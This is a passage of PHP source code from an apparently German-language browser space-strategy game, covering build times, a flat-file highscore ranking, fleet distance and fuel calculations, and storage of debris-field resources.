	function calc_btime_verteidigung($time)
	{
		global $this_planet;
		global $user_array;

		# Einberechnen der Stufe der Werft
		$werft_level = 0;
		if(isset($this_planet['gebaeude']['B10']))
			$werft_level = $this_planet['gebaeude']['B10'];
		$time *= pow(0.975, $werft_level);

		$time = round($time);

		return $time;
	}

	class highscores
	{
		function recalc()
		{
			global $user_array;

			$old_position = $user_array['punkte'][12];
			$old_position_f = ($old_position-1)*32;

			$new_points = floor($user_array['punkte'][0]+$user_array['punkte'][1]+$user_array['punkte'][2]+$user_array['punkte'][3]+$user_array['punkte'][4]+$user_array['punkte'][5]+$user_array['punkte'][6]);
			$new_points_bin = add_nulls(base_convert($new_points, 10, 2), 64);
			$new_points_str = '';
			for($i = 0; $i < strlen($new_points_bin); $i+=8)
				$new_points_str .= chr(bindec(substr($new_points_bin, $i, 8)));
			unset($new_points_bin);
			$my_string = substr($_SESSION['username'], 0, 24);
			if(strlen($_SESSION['username']) < 24)
				$my_string .= str_repeat(' ', 24-strlen($_SESSION['username']));
			if(strlen($_SESSION['username']) > 24)
				$my_string = substr($my_string, 0, 24);
			$my_string .= $new_points_str;

			$filesize = filesize(DB_HIGHSCORES);

			$fh = fopen(DB_HIGHSCORES, 'r+');
			if(!$fh)
				return false;
			flock($fh, LOCK_EX);

			fseek($fh, $old_position_f, SEEK_SET);

			$up = true;

			# Ueberpruefen, ob man in den Highscores abfaellt
			if($filesize-$old_position_f >= 64)
			{
				fseek($fh, 32, SEEK_CUR);
				list(,$this_points) = highscores::get_info(fread($fh, 32));
				fseek($fh, -64, SEEK_CUR);

				if($this_points > $new_points)
					$up = false;
			}

			if($up)
			{
				# In den Highscores nach oben rutschen
				while(true)
				{
					if(ftell($fh) == 0) # Schon auf Platz 1
					{
						fwrite($fh, $my_string);
						break;
					}
					fseek($fh, -32, SEEK_CUR);
					$cur = fread($fh, 32);
					list($this_user,$this_points) = highscores::get_info($cur);

					if($this_points < $new_points)
					{
						# Es muss weiter nach oben verschoben werden

						# Aktuellen Eintrag nach unten verschieben
						fwrite($fh, $cur);
						fseek($fh, -64, SEEK_CUR);
						# In dessen User-Array speichern
						$this_user_array = get_user_array($this_user);
						$this_user_array['punkte'][12]++;
						$this_fh = fopen(DB_PLAYERS.'/'.urlencode($this_user), 'w');
						flock($this_fh, LOCK_EX);
						fwrite($this_fh, gzcompress(serialize($this_user_array)));
						flock($this_fh, LOCK_UN);
						fclose($this_fh);
					}
					else
					{
						fwrite($fh, $my_string);
						break;
					}
				}
			}
			else
			{
				# In den Highscores nach unten rutschen

				while(true)
				{
					if($filesize-ftell($fh) <= 32) # Schon auf dem letzten Platz
					{
						fwrite($fh, $my_string);
						break;
					}

					fseek($fh, 32, SEEK_CUR);
					$cur = fread($fh, 32);
					list($this_user, $this_points) = highscores::get_info($cur);
					fseek($fh, -64, SEEK_CUR);

					if($this_points > $new_points)
					{
						# Es muss weiter nach unten verschoben werden

						# Aktuellen Eintrag nach oben verschieben
						fwrite($fh, $cur);
						# In dessen User-Array speichern
						$this_user_array = get_user_array($this_user);
						$this_user_array['punkte'][12]--;
						$this_fh = fopen(DB_PLAYERS.'/'.urlencode($this_user), 'w');
						flock($this_fh, LOCK_EX);
						fwrite($this_fh, gzcompress(serialize($this_user_array)));
						flock($this_fh, LOCK_UN);
						fclose($this_fh);
					}
					else
					{
						fwrite($fh, $my_string);
						break;
					}
				}
			}

			$act_position = ftell($fh);

			flock($fh, LOCK_UN);
			fclose($fh);

			$act_platz = $act_position/32;
			if($act_platz != $old_position)
			{
				$user_array['punkte'][12] = $act_platz;
				write_user_array();
			}

			return true;
		}

		function get_info($string)
		{
			$username = trim(substr($string, 0, 24));
			$points_str = substr($string, 24);

			$points_bin = '';
			for($i = 0; $i < strlen($points_str); $i++)
				$points_bin .= add_nulls(decbin(ord($points_str{$i})), 8);

			$points = base_convert($points_bin, 2, 10);

			return array($username, $points);
		}

		function get_players_count()
		{
			$filesize = filesize(DB_HIGHSCORES);
			if($filesize === false)
				return false;
			$players = floor($filesize/32);
			return $players;
		}
	}

	function delete_request()
	{
		$url = 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];
		header('Location: '.$url, true, 303);
		die('HTTP redirect: <a href="'.htmlentities($url).'">'.htmlentities($url).'</a>');
	}

	class fleet
	{
		function get_distance($start, $target)
		{
			$this_pos = explode(':', $start);
			$that_pos = explode(':', $target);

			# Entfernung berechnen
			if($this_pos[0] == $that_pos[0]) # Selbe Galaxie
			{
				if($this_pos[1] == $that_pos[1]) # Selbes System
				{
					if($this_pos[2] == $that_pos[2]) # Selber Planet
						$distance = 0.001;
					else # Anderer Planet
						$distance = 0.01*diff($this_pos[2], $that_pos[2]);
				}
				else
				{
					# Anderes System

					$this_x_value = $this_pos[1]-($this_pos[1]%100);
					$this_y_value = $this_pos[1]-$this_x_value;
					$this_y_value -= $this_y_value%10;
					$this_z_value = $this_pos[1]-$this_x_value-$this_y_value;
					$this_x_value /= 100;
					$this_y_value /= 10;

					$that_x_value = $that_pos[1]-($that_pos[1]%100);
					$that_y_value = $that_pos[1]-$that_x_value;
					$that_y_value -= $that_y_value%10;
					$that_z_value = $that_pos[1]-$that_x_value-$that_y_value;
					$that_x_value /= 100;
					$that_y_value /= 10;

					$x_diff = diff($this_x_value, $that_x_value);
					$y_diff = diff($this_y_value, $that_y_value);
					$z_diff = diff($this_z_value, $that_z_value);

					$distance = sqrt(pow($x_diff, 2)+pow($y_diff, 2)+pow($z_diff, 2));
				}
			}
			else # Andere Galaxie
			{
				$galaxy_count = universe::get_galaxies_count()*2;

				$galaxy_diff_1 = diff($this_pos[0], $that_pos[0]);
				$galaxy_diff_2 = diff($this_pos[0]+$galaxy_count, $that_pos[0]);
				$galaxy_diff_3 = diff($this_pos[0], $that_pos[0]+$galaxy_count);
				$galaxy_diff = min($galaxy_diff_1, $galaxy_diff_2, $galaxy_diff_3);

				$radius = (30*$galaxy_count)/(2*pi());
				$distance = sqrt(2*pow($radius, 2)-2*$radius*$radius*cos(($galaxy_diff/$galaxy_count)*2*pi()));
			}

			$distance = round($distance*1000);

			return $distance;
		}

		function calc($mass, $distance, $speed)
		{
			$tritium = round(($distance*$mass)/1000000);

			if($speed <= 0)
				$time = 900;
			else
				$time = round(pow(($mass*$distance)/$speed, 0.3)*300);
			#$time = round(pow(1.125*$mass*pow($distance, 2)/$speed, 0.33333)*10);

			return array($time, $tritium);
		}

		function check_own($flotte) # Ueberprueft, ob eine Flotte eine eigene ist
		{
			global $user_array;

			$own = false;
			$check = ($flotte[7] ? $flotte[3][1] : $flotte[3][0]);
			$planets = array_keys($user_array['planets']);
			foreach($planets as $planet)
			{
				if($user_array['planets'][$planet]['pos'] == $check)
				{
					$own = true;
					break;
				}
			}
			return $own;
		}
	}

	function usort_fleet($fleet1, $fleet2)
	{
		if($fleet1[1][1] > $fleet2[1][1])
			return 1;
		elseif($fleet1[1][1] < $fleet2[1][1])
			return -1;
		else
			return 0;
	}

	class truemmerfeld
	{
		function get($galaxy, $system, $planet)
		{
			# Bekommt die Groesse eines Truemmerfelds

			if(!is_file(DB_TRUEMMERFELDER.'/'.$galaxy.'_'.$system.'_'.$planet))
				return array(0, 0, 0, 0);
			elseif(!is_readable(DB_TRUEMMERFELDER.'/'.$galaxy.'_'.$system.'_'.$planet))
				return false;
			else
			{
				$string = file_get_contents(DB_TRUEMMERFELDER.'/'.$galaxy.'_'.$system.'_'.$planet);

				$rohstoffe = array('', '', '', '');

				$index = 0;
				for($i = 0; $i < strlen($string); $i++)
				{
					$bin = add_nulls(decbin(ord($string{$i})), 8);
					$rohstoffe[$index] .= substr($bin, 0, -1);
					if(!substr($bin, -1)) # Naechste Zahl
						$index++;
				}
				for($rohstoff = 0; $rohstoff < 4; $rohstoff++)
				{
					if($rohstoffe[$rohstoff] == '')
						$rohstoffe[$rohstoff] = 0;
					else
						$rohstoffe[$rohstoff] = base_convert($rohstoffe[$rohstoff], 2, 10);
				}

				return array($rohstoffe[0], $rohstoffe[1], $rohstoffe[2], $rohstoffe[3]);
			}
		}

		function add($galaxy, $system, $planet, $carbon=0, $aluminium=0, $wolfram=0, $radium=0)
		{
			# Fuegt einem Truemmerfeld Rohstoffe hinzu
			$old = truemmerfeld::get($galaxy, $system, $planet);
			if($old === false)
				return false;
			$old[0] += $carbon;
			$old[1] += $aluminium;
			$old[2] += $wolfram;
			$old[3] += $radium;

			return truemmerfeld::set($galaxy, $system, $planet, $old[0], $old[1], $old[2], $old[3]);
		}

		function sub($galaxy, $system, $planet, $carbon=0, $aluminium=0, $wolfram=0, $radium=0)
		{
			# Zieht einem Truemmerfeld Rohstoffe ab
			$old = truemmerfeld::get($galaxy, $system, $planet);
			if($old === false)
				return false;
			$old[0] -= $carbon;
			$old[1] -= $aluminium;
			$old[2] -= $wolfram;
			$old[3] -= $radium;

			if($old[0] < 0)
				$old[0] = 0;
			if($old[1] < 0)
				$old[1] = 0;
			if($old[2] < 0)
				$old[2] = 0;
			if($old[3] < 0)
				$old[3] = 0;

			return truemmerfeld::set($galaxy, $system, $planet, $old[0], $old[1], $old[2], $old[3]);
		}

		function set($galaxy, $system, $planet, $carbon=0, $aluminium=0, $wolfram=0, $radium=0)
		{
			$new = array(
				base_convert($carbon, 10, 2),
				base_convert($aluminium, 10, 2),
				base_convert($wolfram, 10, 2),
				base_convert($radium, 10, 2)
			);

			$string = '';

			for($i = 0; $i < 4; $i++)
			{
				if(strlen($new[$i])%7)
					$new[$i] = str_repeat('0', 7-strlen($new[$i])%7).$new[$i];

				$strlen = strlen($new[$i]);
				for($j = 0; $j < $strlen; $j+=7)
				{
					if($j == $strlen-7)
						$suf = '0';
					else
						$suf = '1';
					$string .= chr(bindec(substr($new[$i], $j, 7).$suf));
				}
			}

			unset($new);

			# Schreiben
			$fh = fopen(DB_TRUEMMERFELDER.'/'.$galaxy.'_'.$system.'_'.$planet, 'w');
			if(!$fh)
				return false;
			flock($fh, LOCK_EX);
			fwrite($fh, $string);
			flock($fh, LOCK_UN);
			fclose($fh);

			return true;
		}
	}
?>